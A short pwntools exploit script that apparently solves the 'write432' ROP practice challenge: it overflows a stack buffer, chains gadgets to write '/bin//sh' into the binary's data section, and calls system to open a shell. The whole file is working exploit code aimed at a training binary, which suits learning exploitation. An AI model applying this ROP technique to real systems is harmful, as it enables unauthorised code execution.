from pwn import *

context(arch='i386', os='linux', log_level='DEBUG')
f = './write432'
p = process(f)
elf = ELF(f)

data_start = 0x804a028
pop2 = 0x80486da
mov_edi_ebp = 0x8048670

p.recvuntil('>')
payload = flat('a'*0x2c,pop2,data_start,'/bin',mov_edi_ebp,pop2,data_start+4,'//sh',mov_edi_ebp,elf.plt['system'],'a'*4,data_start)
p.sendline(payload)

p.interactive()